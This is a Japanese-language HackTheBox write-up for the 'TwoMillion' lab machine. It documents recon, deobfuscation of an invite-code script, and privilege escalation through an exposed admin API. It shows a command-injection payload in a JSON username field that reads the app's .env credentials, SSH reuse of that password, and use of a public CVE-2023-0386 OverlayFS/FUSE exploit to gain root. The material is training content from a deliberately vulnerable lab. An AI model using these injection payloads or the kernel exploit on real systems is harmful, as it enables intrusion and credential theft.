---
title: 'TwoMillion'
description: 'HackTheBox MachineのWriteup'
pubDate: 2026-02-14T10:15:00+09:00
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'JS obfuscation', 'ROT13', 'API', 'CVE-2023-0386']
---

# TwoMillion - HackTheBox

## 初期侵入
### ポート調査
```bash
nmap 10.129.229.66 -Pn
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

nmap 10.129.229.66 -Pn -p 80 -A
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

### ディレクトリ調査
```bash
$ feroxbuster -u http://2million.htb
301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
200      GET       27l      201w    15384c http://2million.htb/images/favicon.png
200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js
405      GET        0l        0w        0c http://2million.htb/api/v1/user/register
405      GET        0l        0w        0c http://2million.htb/api/v1/user/login
200      GET       80l      232w     3704c http://2million.htb/login
401      GET        0l        0w        0c http://2million.htb/api
200      GET       96l      285w     3859c http://2million.htb/invite
200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png
200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css
200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css
200      GET       94l      293w     4527c http://2million.htb/register
200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js
200      GET     1242l     3326w    64952c http://2million.htb/
200      GET       46l      152w     1674c http://2million.htb/404
```

### inviteapi.min.jsの調査
難読化されているのでwebサイトの難読化解除(deobfuscation)ツールを使う  
[js-beautify](https://beautifier.io/)  
Detect packers and obfuscators? (unsafe)を有効にして実行
```js
console.log(
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
)
```
deobfuscation
```js
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}
```
ROT13で暗号化されているので複合化
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate \
  -H "Content-Type: application/json"
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
複合化
```bash
"In order to generate the invite code, make a POST request to /api/v1/invite/generate"
```
```bash
$ curl -X POST http://2million.htb/api/v1/invite/generate \
  -H "Content-Type: application/json"
{"0":200,"success":1,"data":{"code":"RE9LTEctMjhDWFItWFZNMFYtMk42WlY=","format":"encoded"}}

$ echo "RE9LTEctMjhDWFItWFZNMFYtMk42WlY=" | base64 -d
DOKLG-28CXR-XVM0V-2N6ZV
```

### APIの脆弱性を調査
```bash
# /api/v1
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
それぞれのAPIでエラーメッセージを表示してくれるので、それを元に実行していく
```bash
$ curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml" \
  -d ''

{"status":"danger","message":"Missing parameter: email"}

$ curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml" \
  -d '{"email":"test@test.com"}'

{"status":"danger","message":"Missing parameter: is_admin"}

$ curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml" \
  -d '{"email":"test@test.com", "is_admin":1}'

{"id":13,"username":"test","is_admin":1}

$ curl -X GET http://2million.htb/api/v1/admin/auth  \
-H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml"

{"message":true}

$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml" \
  -H "Content-Type: application/json" \
  -d ''

{"status":"danger","message":"Missing parameter: username"}

$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin; ls;"}'

Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views

$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Cookie: PHPSESSID=imo35183458bmvchesirsr79ml" \
-H "Content-Type: application/json" \
-d '{"username": "admin; cat .env;"}'

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
### SSHアクセス
```bash
ssh admin@10.129.229.66 # SuperDuperPass123

admin@2million:~$ ls
user.txt
```

## 権限昇格
`/usr/bin/fusermount3`一般的なsuidではないと判断し、調査したがうまく進められなかった
```bash
admin@2million:~$ sudo -l
[sudo] password for admin:
Sorry, user admin may not run sudo on localhost.

admin@2million:~$ find / -perm -4000 2>/dev/null
/snap/snapd/19122/usr/lib/snapd/snap-confine
/snap/core20/1891/usr/bin/chfn
/snap/core20/1891/usr/bin/chsh
/snap/core20/1891/usr/bin/gpasswd
/snap/core20/1891/usr/bin/mount
/snap/core20/1891/usr/bin/newgrp
/snap/core20/1891/usr/bin/passwd
/snap/core20/1891/usr/bin/su
/snap/core20/1891/usr/bin/sudo
/snap/core20/1891/usr/bin/umount
/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1891/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
```bash
admin@2million:~$ fusermount3 --version
fusermount3 version: 3.10.5

admin@2million:~$ fusermount3 --help
fusermount3: [options] mountpoint
Options:
 -h		    print help
 -V		    print version
 -o opt[,opt...]    mount options
 -u		    unmount
 -q		    quiet
 -z		    lazy unmount
```
linpeasを実行していると、mailファイルを見つけ、確認してみると脆弱性の情報が書かれていた
```bash
# linpeas.sh
╔══════════╣ Mails (limit 50)
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
```

```bash
$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

# データベース移行を全力で進めてくれているのは承知しています。サービスが一部停止している間に、ウェブホストのOSもアップグレードしてもらえませんか？今年は既に深刻なLinuxカーネルのCVEがいくつか発生しています。OverlayFS / FUSEの脆弱性は特に厄介そうです。絶対に被害に遭うわけにはいきません。

HTB Godfather
```

`OverlayFS / FUSE exploit` を検索すると`CVE-2023-0386`の情報が出てくる  
githubからダウンロードして、ターゲット環境で実行する
```bash
# tty01
admin@2million:/tmp/CVE-2023-0386$ make all

admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601

# tty02
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Feb 13 13:47 .
drwxrwxr-x 6 root   root     4096 Feb 13 13:47 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```
```bash
root@2million:/tmp/CVE-2023-0386# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)

root@2million:/tmp/CVE-2023-0386# ls /root
root.txt  snap  thank_you.json
```